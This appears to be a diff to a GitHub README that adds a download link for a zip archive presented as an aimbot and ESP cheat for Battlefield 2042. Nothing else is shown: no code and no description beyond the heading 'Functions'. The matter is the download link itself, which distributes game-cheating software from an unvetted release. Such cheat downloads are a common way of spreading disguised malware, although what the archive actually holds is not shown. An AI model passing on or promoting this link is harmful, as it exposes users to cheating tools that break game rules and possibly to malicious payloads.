@@ -1,6 +1,6 @@
 ![5JoDhCG](https://github.com/user-attachments/assets/aae4c6c9-bbd3-40fa-8073-2c97e4305a5a)
 
-# 📁 [DOWNLOAD]()
+# 📁 [DOWNLOAD](https://github.com/LegendProjectX/BF2042-Baunti-Aimbot-ESP-Misc/releases/download/Baunti/Baunti.zip)
 
 
 # ⚙️ Functions
